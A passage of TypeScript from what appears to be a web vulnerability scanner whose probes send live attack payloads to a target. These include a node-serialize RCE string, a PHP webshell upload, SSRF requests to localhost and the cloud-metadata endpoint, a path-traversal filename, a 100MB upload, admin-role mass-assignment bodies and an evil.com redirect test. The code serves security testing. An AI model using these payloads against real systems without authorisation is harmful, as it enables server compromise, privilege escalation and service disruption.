      const resp = await fetch(httpUrl, {
        method: "HEAD",
        headers: FETCH_HEADERS,
        redirect: "manual",
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (resp) {
        const isRedirect = resp.status >= 300 && resp.status < 400;
        const location = resp.headers.get("location") || "";
        if (!isRedirect || !location.startsWith("https://")) {
          return {
            type: "missing-https-redirect",
            severity: "MEDIUM",
            url: httpUrl,
            evidence: `HTTP version of the site at ${httpUrl} does not automatically redirect to HTTPS (responded with ${resp.status}). Users who manually type the domain or follow an HTTP link will send credentials and session cookies in cleartext, visible to network eavesdroppers on public Wi-Fi or ISP-level passive monitoring.`,
            cvssScore: 6.5,
            cveId: "CWE-319",
          };
        }
      }
    } catch { /* skip */ }
  }
  return null;
}

/**
 * Unauthenticated API Endpoint Access
 * Tests common API endpoints to see if they return sensitive data without authentication.
 */
async function probeUnauthenticatedAPIAccess(targetUrl: string): Promise<PendingFinding | null> {
  const SENSITIVE_API_PATHS = [
    "/api/users", "/api/v1/users", "/api/v2/users",
    "/api/admin", "/api/v1/admin",
    "/api/accounts", "/api/customers",
    "/api/payments", "/api/orders",
    "/api/config", "/api/settings",
    "/api/keys", "/api/tokens",
    "/api/me", "/api/profile",
    "/api/dashboard",
    "/admin/api/users",
  ];
  const SENSITIVE_PATTERNS = /email|username|password|token|apiKey|secret|credit|ssn|phone|address|balance/i;

  for (const path of SENSITIVE_API_PATHS) {
    try {
      const url = new URL(path, targetUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (!resp || resp.status !== 200) continue;
      const ct = resp.headers.get("content-type") || "";
      if (!ct.includes("application/json")) continue;
      const body = await resp.text();
      if (SENSITIVE_PATTERNS.test(body) && body.length > 50) {
        return {
          type: "unauthenticated-api-access",
          severity: "CRITICAL",
          url,
          evidence: `API endpoint at ${url} returned sensitive data (${SENSITIVE_PATTERNS.exec(body)?.[0]}) with HTTP 200 and no authentication required. This constitutes a Broken Access Control (OWASP A01:2021) vulnerability. An attacker can enumerate all users, extract personal data, or access admin functionality without any credentials.`,
          cvssScore: 9.1,
          cveId: "CWE-862",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

/**
 * HTML Injection (without JavaScript — Content Injection)
 * Tests if HTML tags are reflected without script execution.
 * Can be used for phishing, defacement, or social engineering.
 */
async function probeHTMLInjection(paramUrl: string): Promise<PendingFinding | null> {
  const PAYLOADS = [
    `<h1>VulnScanProbe</h1>`,
    `<b>VulnScanProbe</b>`,
    `<a href="https://evil.com">VulnScanProbe</a>`,
  ];
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    for (const param of params) {
      for (const payload of PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 5000);
          if (!resp) continue;
          const body = await resp.text();
          // Reflected unencoded HTML tag inside the body
          const bodyMatch = body.match(/<body[^>]*>([\s\S]*)<\/body>/i);
          const contentToCheck = bodyMatch ? bodyMatch[1] : body;

          if (contentToCheck.includes(payload) && !contentToCheck.includes(payload.replace(/</g, "&lt;")) && !contentToCheck.includes("&#60;") && !contentToCheck.includes("\\u003c")) {
            return {
              type: "html-injection",
              severity: "MEDIUM",
              url: testUrl.toString(),
              parameter: param,
              evidence: `HTML Injection detected. The payload "${payload.substring(0, 50)}" injected into parameter "${param}" is reflected as raw HTML in the response body. While XSS may be blocked by a WAF, HTML injection enables phishing content injection, page defacement, and social engineering attacks.`,
              cvssScore: 5.4,
              cveId: "CWE-79",
            };
          }
        } catch { /* next */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * Information Disclosure — Debug Mode & Error Details
 * Checks for framework debug pages, Django/Flask debug modes,
 * Laravel/Symfony debug toolbars exposed in production.
 */
async function probeDebugModeExposure(targetUrl: string): Promise<PendingFinding | null> {
  const DEBUG_PATHS = [
    "/_ah/admin", "/admin/debug", "/debug", "/__debug__/",
    "/_profiler/open", "/telescope", "/horizon", "/_ignition/health-check",
    "/_framework/staticfiles/", "/elmah.axd", "/trace.axd", "/dump", "/?debug=1",
    "/__debugger__", "/console", "/docs", "/redoc", "/openapi.json", "/swagger.json",
    "/__nextjs_original-stack", "/@vite/client",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/heapdump", "/actuator/mappings",
  ];
  const DEBUG_MARKERS = [
    /Traceback \(most recent call last\)/i,          // Python
    /Werkzeug Powered Traceback|Interactive Console/i, // Werkzeug Debugger
    /swagger-ui|redoc-container|openapi: 3\./i,       // FastAPI / Swagger docs
    /Laravel.*whoops|Whoops.*Laravel/i,              // Laravel
    /Symfony.*exception.*details/i,                   // Symfony
    /DEBUG.*=.*True|DJANGO_DEBUG|Technical500Response/i, // Django
    /__nextjs_original-stack/i,                       // Next.js debug
    /"_links":\s*\{"self":\s*\{"href":\s*".*actuator"/i,// Spring Actuator
    /Application has thrown an uncaught exception|stack trace/i,
    /at\s+[\w.]+\([\w./]+:\d+:\d+\)/,                // Node.js stack trace
    /xdebug-error|Xdebug v[\d.]+/i,                  // PHP XDebug
  ];

  for (const path of DEBUG_PATHS) {
    try {
      const url = new URL(path, targetUrl).toString();
      const resp = await safeFetch(url, 4000);
      if (!resp || (resp.status !== 200 && resp.status !== 500)) continue;
      const body = await resp.text();
      const hit = DEBUG_MARKERS.find(p => p.test(body));
      if (hit) {
        return {
          type: "debug-mode-exposed",
          severity: path.includes("/docs") || path.includes("/openapi.json") ? "MEDIUM" : "HIGH",
          url,
          evidence: `Debug/development mode or API documentation is exposed in production at ${url}. The response contains debug information including stack traces, framework internals, interactive debuggers, or open API specs. This reveals internal architecture, endpoints, environment variables, or database queries.`,
          cvssScore: path.includes("/docs") || path.includes("/openapi.json") ? 5.3 : 7.5,
          cveId: "CWE-94",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

/** Fetch discovered JS files and scan for hardcoded secrets or dangerous patterns. */
async function analyzeJSFiles(html: string, baseUrl: string): Promise<PendingFinding[]> {
  const base = new URL(baseUrl);
  const findings: PendingFinding[] = [];
  const jsSrcs: string[] = [];
  for (const m of html.matchAll(/src=["']([^"']+\.js(?:\?[^"']*)?)["']/gi)) {
    try {
      const u = new URL(m[1], baseUrl);
      if (u.hostname === base.hostname) jsSrcs.push(u.href);
    } catch { /* skip */ }
  }
  const SECRET_PATTERNS: Array<{ label: string; re: RegExp }> = [
    { label: "AWS Access Key", re: /AKIA[0-9A-Z]{16}/ },
    { label: "Generic API key", re: /api[_-]?key\s*[:=]\s*["'][A-Za-z0-9_\-]{20,}["']/i },
    { label: "Bearer token", re: /bearer\s+[A-Za-z0-9\-._~+/]+=*/i },
    { label: "Stripe secret key", re: /sk_(live|test)_[0-9a-zA-Z]{24}/ },
    { label: "Private key header", re: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },
    { label: "Hardcoded password", re: /password\s*[:=]\s*["'][^"']{6,}["']/i },
    { label: "eval() usage", re: /\beval\s*\(/ },
    { label: "document.write", re: /document\.write\s*\(/ },
    { label: "innerHTML assignment", re: /\.innerHTML\s*=\s*[^;]{0,80}(?:params|query|search|hash|location)/i },
  ];
  let secretFound = false;
  let jsIssueFound = false;
  for (const src of jsSrcs.slice(0, 5)) {
    try {
      const resp = await safeFetch(src, 5000);
      if (!resp || !resp.ok) continue;
      const code = await resp.text();
      for (const { label, re } of SECRET_PATTERNS) {
        if (re.test(code)) {
          const isSecret = !label.includes("eval") && !label.includes("document") && !label.includes("innerHTML");
          if (isSecret && !secretFound) {
            findings.push({
              type: "js-secret-disclosure",
              severity: "CRITICAL",
              url: src,
              evidence: `"${label}" pattern detected in JavaScript file ${src}. Hardcoded credentials or API keys in client-side JS are fully visible to any user who opens DevTools and can be used to authenticate as the application or access third-party services.`,
              cvssScore: 9.5,
              cveId: "CWE-312",
            });
            secretFound = true;
          } else if (!isSecret && !jsIssueFound) {
            findings.push({
              type: "js-dangerous-sink",
              severity: "HIGH",
              url: src,
              evidence: `"${label}" detected in JavaScript file ${src}. DOM-based sinks like eval(), document.write(), or innerHTML assignment with location/query data are prime vectors for DOM XSS if any upstream input is attacker-controlled.`,
              cvssScore: 7.5,
              cveId: "CWE-79",
            });
            jsIssueFound = true;
          }
        }
      }
    } catch { /* skip */ }
  }
  return findings;
}

async function safeFetch(url: string, timeoutMs = 10000): Promise<Response | null> {
  try {
    const res = await fetch(url, {
      method: "GET",
      headers: FETCH_HEADERS,
      redirect: "follow",
      signal: AbortSignal.timeout(timeoutMs),
      // @ts-ignore – Next.js cache bypass
      next: { revalidate: 0 },
    });
    return res;
  } catch {
    return null;
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #1: INSECURE DESERIALIZATION (CWE-502)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes for insecure deserialization vulnerabilities in Node.js, Python, and PHP.
 * Tests for common RCE payloads targeting:
 *  - Node.js node-serialize RCE
 *  - Python Pickle/YAML deserialization
 *  - PHP unserialize() gadget chains
 */
async function probeInsecureDeserialization(paramUrl: string): Promise<PendingFinding | null> {
  const DESER_PAYLOADS = [
    // Node.js node-serialize RCE payload (simplified)
    { payload: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}"}', db: "Node.js node-serialize" },
    // Python Pickle (marker payload)
    { payload: "B\x00\x00\x00\x00\x00c__main__\nRCE\nq\x00)Rq\x01.", db: "Python Pickle" },
    // Generic JSON deserialization attempt with __proto__
    { payload: '{"__proto__":{"isAdmin":true}}', db: "Prototype-based deserialization" },
  ];

  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params.slice(0, 3)) {
      for (const { payload } of DESER_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const resp = await safeFetch(testUrl.toString(), 6000);
          if (!resp) continue;
          const body = await resp.text();

          // Check for RCE indicators or error messages revealing deserialization
          if (/uid=\d+\(|root:x:0:0|unpickling error|Pickle protocol|node-serialize|PHP Object|__PHP_Incomplete_Class/i.test(body)) {
            return {
              type: "insecure-deserialization",
              severity: "CRITICAL",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Insecure Deserialization vulnerability confirmed via parameter "${param}". The injected payload triggered either RCE output or deserialization error messages revealing the serialization engine. An attacker can craft malicious serialized objects to execute arbitrary code on the server.`,
              cvssScore: 9.8,
              cveId: "CWE-502",
            };
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #2: ACTIVE OPEN REDIRECT VALIDATION (CWE-601)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Actively tests open redirect parameters by injecting external domains
 * and validating if the response Location header contains the attacker's domain.
 * This goes beyond passive detection — it confirms exploitability.
 */
async function probeActiveOpenRedirect(html: string, baseUrl: string, paramUrls: string[] = []): Promise<PendingFinding | null> {
  const REDIRECT_PARAMS = ["redirect", "url", "next", "return", "goto", "dest", "destination", "rurl", "target", "continue"];
  const EXTERNAL_TEST_DOMAIN = "https://attacker-vulnscan.evil.com";

  // Extract URLs with redirect parameters from HTML
  const paramUrlRegex = /(?:href|action)=["']([^"']*[?&](?:redirect|url|next|return|goto|dest|destination|rurl|target|continue)=[^"']*?)["']/gi;
  const matches = [...html.matchAll(paramUrlRegex)];

  for (const match of matches) {
    try {
      const baseUrlObj = new URL(match[1], baseUrl);

      // Test each redirect parameter
      for (const param of REDIRECT_PARAMS) {
        if (!baseUrlObj.toString().includes(param)) continue;

        try {
          const testUrl = new URL(baseUrlObj.toString());
          testUrl.searchParams.set(param, EXTERNAL_TEST_DOMAIN);

          const resp = await fetch(testUrl.toString(), {
            method: "GET",
            headers: FETCH_HEADERS,
            redirect: "manual", // Don't follow redirects automatically
            signal: AbortSignal.timeout(5000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp) continue;

          // Check Location header for the external domain
          const location = resp.headers.get("location") || "";
          if (location.includes("attacker-vulnscan.evil.com") || location === EXTERNAL_TEST_DOMAIN) {
            return {
              type: "open-redirect-active",
              severity: "MEDIUM",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Active Open Redirect confirmed. The application accepts the external domain "${EXTERNAL_TEST_DOMAIN}" in parameter "${param}" and responds with Location: ${location}. An attacker can craft phishing links like [yoursite.com]?redirect=https://evil.com/phishing that start on your trusted domain then redirect users to steal credentials or distribute malware.`,
              cvssScore: 6.1,
              cveId: "CWE-601",
            };
          }
        } catch { /* next param */ }
      }
    } catch { /* skip malformed URL */ }
  }

  // Also test discovered param URLs that have redirect-like parameter names
  for (const crawledUrl of paramUrls.slice(0, 10)) {
    try {
      const crawledParsed = new URL(crawledUrl);
      for (const key of crawledParsed.searchParams.keys()) {
        if (!REDIRECT_PARAMS.some(p => key.toLowerCase().includes(p))) continue;
        const testUrl = new URL(crawledParsed.toString());
        testUrl.searchParams.set(key, EXTERNAL_TEST_DOMAIN);
        const resp = await fetch(testUrl.toString(), {
          method: "GET",
          headers: FETCH_HEADERS,
          redirect: "manual",
          signal: AbortSignal.timeout(5000),
          // @ts-ignore
          next: { revalidate: 0 },
        }).catch(() => null);
        if (!resp) continue;
        const location = resp.headers.get("location") || "";
        if (location.includes("attacker-vulnscan.evil.com")) {
          return {
            type: "open-redirect-active",
            severity: "MEDIUM",
            url: testUrl.toString(),
            parameter: key,
            evidence: `Active Open Redirect confirmed via crawler-discovered parameter "${key}". The application redirects to the external domain "${EXTERNAL_TEST_DOMAIN}" (Location: ${location}).`,
            cvssScore: 6.1,
            cveId: "CWE-601",
          };
        }
      }
    } catch { /* skip */ }
  }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #3: SOFTWARE COMPOSITION ANALYSIS (CWE-1104 / OWASP A06:2021)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Attempts to read package.json and package-lock.json to identify dependencies
 * and their versions. Cross-references against a basic vulnerability list.
 * This implements SCA (Software Composition Analysis) for vulnerable components.
 */
async function probeSoftwareCompositionAnalysis(baseUrl: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];
  const COMMON_VULN_PACKAGES: Record<string, { minVersion?: string; affectedVersions: string[] }> = {
    "lodash": { affectedVersions: ["<4.17.11"] }, // Prototype pollution RCE
    "jquery": { affectedVersions: ["<3.4.0"] }, // XSS & prototype pollution
    "express": { affectedVersions: ["<4.18.0"] }, // Open Redirect & other issues
    "mongoose": { affectedVersions: ["<5.10.0"] }, // NoSQL injection
    "node-serialize": { affectedVersions: ["<0.0.4"] }, // RCE via deserialization
    "pyyaml": { affectedVersions: ["<5.3.1"] }, // Unsafe YAML deserialization
    "django": { affectedVersions: ["<2.2.8"] }, // Multiple RCE & injection issues
    "flask": { affectedVersions: ["<1.1.0"] }, // Path traversal & SSTI
  };

  const packagePaths = [
    "/package.json",
    "/package-lock.json",
    "/pom.xml",
    "/requirements.txt",
    "/Gemfile.lock",
    "/composer.lock",
    "/Cargo.lock",
  ];

  for (const path of packagePaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (!resp || resp.status !== 200) continue;
      const content = await resp.text();
      if (!content || content.length < 50) continue;

      // Parse package.json for npm
      if (path === "/package.json") {
        try {
          const pkg = JSON.parse(content);
          const allDeps = {
            ...pkg.dependencies,
            ...pkg.devDependencies,
          };

          for (const [name, versionStr] of Object.entries(allDeps)) {
            // semver: correct version comparison — "10.0.0" > "4.17.11" is now properly true
            // The old string comparison had: "10" < "4.17.11" === true (wrong!)
            const cleanVersion = String(versionStr).replace(/^[~^>=<]/, "");
            if (COMMON_VULN_PACKAGES[name] && cleanVersion) {
              const vuln = COMMON_VULN_PACKAGES[name];
              const isVulnerable = vuln.affectedVersions.some((constraint) => {
                try {
                  // constraint format: "<4.17.11" → threshold "4.17.11"
                  const threshold = constraint.replace(/^[<>]=?/, "");
                  const op = constraint.startsWith("<=") ? "lte" :
                             constraint.startsWith("<") ? "lt" :
                             constraint.startsWith(">=") ? "gte" : "gt";
                  const coerced = semver.coerce(cleanVersion);
                  if (!coerced) return false;
                  return semver[op](coerced, threshold);
                } catch { return false; }
              });
              if (isVulnerable) {
                findings.push({
                  type: "vulnerable-dependency",
                  severity: "HIGH",
                  url,
                  parameter: `${name}@${versionStr}`,
                  evidence: `Vulnerable dependency detected in package.json: "${name}@${versionStr}" is known to contain security vulnerabilities. Attackers can exploit this package's flaws to achieve RCE, bypass authentication, or manipulate application logic. Update to a patched version immediately.`,
                  cvssScore: 7.5,
                  cveId: "CWE-1104",
                });
              }
            }
          }
        } catch { /* JSON parse failed */ }
      }

      // package-lock.json analysis (more detailed dependency tree)
      if (path === "/package-lock.json") {
        try {
          const parsed = JSON.parse(content);
          if (parsed && (parsed.lockfileVersion || parsed.dependencies || parsed.packages)) {
            findings.push({
              type: "sensitive-file-exposed",
              severity: "MEDIUM",
              url,
              evidence: `package-lock.json is publicly accessible. This file contains the full dependency tree with exact versions of all transitive dependencies. Attackers can use this to identify vulnerable sub-dependencies and build targeted exploits.`,
              cvssScore: 5.3,
              cveId: "CWE-1104",
            });
          }
        } catch {
          // Content is not valid JSON, ignore false positive 200 OK HTML pages
        }
      }
    } catch { /* skip */ }
  }

  return findings;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #4: OUT-OF-BAND / CALLBACK-BASED PROBING (Blind Vulnerability Detection)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Infrastructure for OOB (Out-of-Band) probing. This simplified version uses
 * timing-based detection for blind vulnerabilities (Blind SSRF, Blind XXE, Blind RCE).
 * A full implementation would use an interaction server (Interactsh, Burp Collaborator).
 * 
 * For now, we implement DNS callback simulation and timing-based validation.
 */
async function probeBlindSSRFWithTiming(paramUrl: string): Promise<PendingFinding | null> {
  // Detect SSRF by checking if injecting localhost causes timing delays
  const SSRF_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://localhost:9999",
    "http://169.254.169.254/latest/meta-data/", // AWS metadata
    "http://[::1]:8080", // IPv6 localhost
    "gopher://127.0.0.1",
  ];

  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    const baselineStart = Date.now();
    const baselineResp = await safeFetch(u.toString(), 3000);
    const baselineTime = Date.now() - baselineStart;

    for (const param of params.slice(0, 2)) {
      for (const payload of SSRF_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, payload);
          const start = Date.now();
          const resp = await fetch(testUrl.toString(), {
            headers: FETCH_HEADERS,
            signal: AbortSignal.timeout(8000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);
          const elapsed = Date.now() - start;

          // FP-FIX #5: Timing-based SSRF detection: 3s threshold with 3-attempt confirmation
          if (resp && elapsed > baselineTime + 3000) {
            // Verify with 2 more measurements to eliminate network jitter
            let hitCount = 1;
            for (let i = 0; i < 2; i++) {
              const start2 = Date.now();
              await fetch(testUrl.toString(), {
                headers: FETCH_HEADERS,
                signal: AbortSignal.timeout(8000),
                // @ts-ignore
                next: { revalidate: 0 },
              }).catch(() => null);
              if ((Date.now() - start2) > baselineTime + 3000) hitCount++;
            }
            if (hitCount < 2) continue; // Not reproducible — likely network jitter
            return {
              type: "blind-ssrf-timing",
              severity: "HIGH",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Blind Server-Side Request Forgery (SSRF) detected via timing analysis (${hitCount}/3 attempts delayed). Request to local/internal URL "${payload}" took ${elapsed}ms vs baseline ${baselineTime}ms. The application fetches URLs from user input without validation, allowing attackers to scan internal networks, access metadata services, or pivot to internal services.`,
              cvssScore: 8.6,
              cveId: "CWE-918",
            };
          }
        } catch { /* next */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #6: FILE UPLOAD VULNERABILITIES (CWE-434 / OWASP A03:2021)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes for file upload vulnerabilities by testing common upload endpoints
 * with malicious file types and oversized files.
 * Tests for: unrestricted file types, missing size limits, path traversal in uploads
 */
async function probeFileUploadVulnerabilities(baseUrl: string, html: string): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  // Extract upload form endpoints
  const uploadForms: Array<{ action: string; fieldName: string }> = [];
  for (const formMatch of html.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi)) {
    const formBody = formMatch[1] || "";
    const fullForm = formMatch[0];

    // Check for file input fields
    const fileInputMatch = formBody.match(/<input[^>]+type=["']?file["']?[^>]*name=["']([^"']+)["']/i);
    if (fileInputMatch) {
      const actionMatch = fullForm.match(/action=["']([^"']+)["']/i);
      const actionUrl = actionMatch ? new URL(actionMatch[1], baseUrl).toString() : baseUrl;
      uploadForms.push({ action: actionUrl, fieldName: fileInputMatch[1] });
    }
  }

  // Also probe common upload API endpoints (expanded for better discovery)
  const uploadApiPaths = [
    "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/uploads", "/upload",
    "/api/file/upload", "/api/files/upload", "/rest/file/upload", "/file/upload",
    "/files/upload", "/upload/file", "/api/images/upload", "/api/media/upload",
    "/upload/image", "/upload/document", "/upload/file", "/api/v1/file/upload",
  ];

  for (const path of uploadApiPaths) {
    try {
      const url = new URL(path, baseUrl).toString();
      const resp = await safeFetch(url, 5000);
      if (resp && (resp.status === 200 || resp.status === 405)) {
        const text = await resp.text().catch(() => "");
        if (!isSpaHtmlFallback(resp, text)) {
          uploadForms.push({ action: url, fieldName: "file" });
        }
      }
    } catch { /* skip */ }
  }

  if (uploadForms.length === 0) return findings;

  // Test each upload endpoint
  for (const { action, fieldName } of uploadForms.slice(0, 3)) {
    try {
      // Test 1: Executable file upload (webshell)
      const webshellContent = "<?php system($_GET['cmd']); ?>";
      const webshellFormData = new FormData();
      webshellFormData.append(fieldName, new Blob([webshellContent], { type: "application/x-php" }), "shell.php");

      const webshellResp = await fetch(action, {
        method: "POST",
        body: webshellFormData,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (webshellResp && webshellResp.ok) {
        const text = await webshellResp.text().catch(() => "");
        if (!isSpaHtmlFallback(webshellResp, text)) {
          findings.push({
            type: "file-upload-executable",
            severity: "CRITICAL",
            url: action,
            parameter: fieldName,
            evidence: `File upload endpoint ${action} accepts executable PHP files without validation. An attacker can upload webshells to achieve Remote Code Execution on the server.`,
            cvssScore: 9.8,
            cveId: "CWE-434",
          });
        }
      }

      // Test 2: Oversized file (DoS via large upload)
      const largeFile = new Uint8Array(100 * 1024 * 1024); // 100MB
      const largeFormData = new FormData();
      largeFormData.append(fieldName, new Blob([largeFile], { type: "application/octet-stream" }), "large.bin");

      const largeResp = await fetch(action, {
        method: "POST",
        body: largeFormData,
        signal: AbortSignal.timeout(10000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (largeResp && largeResp.ok) {
        const text = await largeResp.text().catch(() => "");
        if (!isSpaHtmlFallback(largeResp, text)) {
          findings.push({
            type: "file-upload-no-size-limit",
            severity: "HIGH",
            url: action,
            parameter: fieldName,
            evidence: `File upload endpoint ${action} accepts files >100MB without size validation. This enables DoS attacks via storage exhaustion.`,
            cvssScore: 7.5,
            cveId: "CWE-770",
          });
        }
      }

      // Test 3: Path traversal in filename
      const traversalFormData = new FormData();
      traversalFormData.append(fieldName, new Blob(["test"], { type: "text/plain" }), "../../../etc/passwd");

      const traversalResp = await fetch(action, {
        method: "POST",
        body: traversalFormData,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (traversalResp && traversalResp.ok) {
        const text = await traversalResp.text().catch(() => "");
        if (!isSpaHtmlFallback(traversalResp, text)) {
          findings.push({
            type: "file-upload-path-traversal",
            severity: "HIGH",
            url: action,
            parameter: fieldName,
            evidence: `File upload endpoint ${action} accepts path traversal sequences in filenames. Attackers may overwrite system files or write to arbitrary locations.`,
            cvssScore: 8.1,
            cveId: "CWE-22",
          });
        }
      }

      // Test 4: MIME type spoofing
      const spoofedFormData = new FormData();
      spoofedFormData.append(fieldName, new Blob(["<?php system('cmd'); ?>"], { type: "image/jpeg" }), "image.jpg.php");

      const spoofedResp = await fetch(action, {
        method: "POST",
        body: spoofedFormData,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (spoofedResp && spoofedResp.ok) {
        const text = await spoofedResp.text().catch(() => "");
        if (!isSpaHtmlFallback(spoofedResp, text)) {
          findings.push({
            type: "file-upload-mime-spoofing",
            severity: "HIGH",
            url: action,
            parameter: fieldName,
            evidence: `File upload endpoint ${action} relies on client-provided Content-Type headers without validation. Attackers can upload malicious files disguised as safe types.`,
            cvssScore: 7.5,
            cveId: "CWE-434",
          });
        }
      }

    } catch { /* next endpoint */ }
  }

  return findings;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #7: MASS ASSIGNMENT / PARAMETER TAMPERING (CWE-915 / OWASP A01:2021)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes for mass assignment vulnerabilities by injecting unexpected parameters
 * into API endpoints (e.g., role: "admin", isAdmin: true).
 * Tests for: privilege escalation via parameter injection, object mass assignment
 */
async function probeMassAssignment(baseUrl: string, jsBundleEndpoints: JsApiEndpoint[], session: AuthSession): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  const PRIVILEGE_ESCALATION_PAYLOADS = [
    { role: "admin" },
    { isAdmin: true },
    { admin: true },
    { role: "administrator" },
    { permissions: ["admin", "superuser"] },
    { userType: "admin" },
  ];

  // Test registration/update endpoints (expanded for better discovery)
  const sensitiveEndpoints = [
    "/api/users", "/api/v1/users", "/api/v2/users", "/api/register", "/api/signup",
    "/rest/user/register", "/api/user/register", "/api/account", "/api/auth/register",
    "/api/v1/register", "/api/v2/register", "/user/register", "/auth/register",
    "/users", "/register", "/signup", "/create-account", "/join",
  ];

  for (const path of sensitiveEndpoints) {
    try {
      const url = new URL(path, baseUrl).toString();

      // First, try a normal registration to understand the expected fields
      const testEmail = `test_${Date.now()}@vulnscan.internal`;
      const normalBody = { email: testEmail, password: "TestPassword123!", username: "testuser" };

      const normalResp = await authedFetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(normalBody),
      }, 6000, false, session);

      if (!normalResp || normalResp.status === 404) continue;

      // Now try with privilege escalation payloads
      for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
        const escalatedBody = { ...normalBody, ...payload };

        const escalatedResp = await authedFetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(escalatedBody),
        }, 6000, false, session);

        if (escalatedResp && (escalatedResp.status === 200 || escalatedResp.status === 201)) {
          const text = await escalatedResp.text().catch(() => "");
          try {
            const json = JSON.parse(text);
            const key = Object.keys(payload)[0];
            const val = payload[key as keyof typeof payload];

            const isEscalated =
              json[key] === val ||
              (key === "role" && (json.role === "admin" || json.role === "administrator")) ||
              (key === "isAdmin" && json.isAdmin === true) ||
              (key === "admin" && json.admin === true);

            if (isEscalated) {
              findings.push({
                type: "mass-assignment-privilege-escalation",
                severity: "CRITICAL",
                url,
                parameter: key,
                evidence: `Mass Assignment vulnerability confirmed. Injecting parameter "${key}: ${val}" during registration modified the account role in JSON response.`,
                cvssScore: 9.8,
                cveId: "CWE-915",
                isVerified: true,
                confidence: CONFIDENCE.EXEC_VERIFIED,
              });
              break;
            }
          } catch { /* not valid JSON response */ }
        }
      }
    } catch { /* next endpoint */ }
  }

  // Test JS-discovered endpoints for mass assignment
  for (const endpoint of jsBundleEndpoints) {
    if (endpoint.path.includes("user") || endpoint.path.includes("profile") || endpoint.path.includes("account")) {
      try {
        const url = new URL(endpoint.path, baseUrl).toString();

        for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
          const body: Record<string, any> = {};
          for (const field of endpoint.fields) {
            body[field] = field === "email" ? `test_${Date.now()}@vulnscan.internal` : "test";
          }
          Object.assign(body, payload);

          const resp = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (resp && (resp.status === 200 || resp.status === 201)) {
            const text = await resp.text().catch(() => "");
            try {
              const json = JSON.parse(text);
              const key = Object.keys(payload)[0];
              const val = payload[key as keyof typeof payload];

              if (json[key] === val || json.role === "admin" || json.isAdmin === true) {
                findings.push({
                  type: "mass-assignment",
                  severity: "HIGH",
                  url,
                  parameter: key,
                  evidence: `Mass Assignment vulnerability detected at ${url}. Parameter "${key}" was merged into user object.`,
                  cvssScore: 8.5,
                  cveId: "CWE-915",
                  isVerified: true,
                  confidence: CONFIDENCE.DUAL_VERIFIED,
                });
                break;
              }
            } catch { /* not valid JSON */ }
          }
        }
      } catch { /* next endpoint */ }
    }
  }

  return findings;
}

// ══════════════════════════════════════════════════════════════════════════════
// GAP FIX #8: BUSINESS LOGIC VULNERABILITIES (CWE-840 / OWASP A01:2021)
// ══════════════════════════════════════════════════════════════════════════════

/**
 * Probes for business logic vulnerabilities including:
 * - Price manipulation
 * - Coupon/promo code abuse
 * - Feedback/review tampering
 * - Basket manipulation
 */
async function probeBusinessLogicVulnerabilities(baseUrl: string, session: AuthSession): Promise<PendingFinding[]> {
  const findings: PendingFinding[] = [];

  // Helper to verify that response is a genuine successful JSON API response (not an error JSON or HTML SPA fallback)
  const isSuccessfulJsonResponse = async (resp: Response | null): Promise<any | null> => {
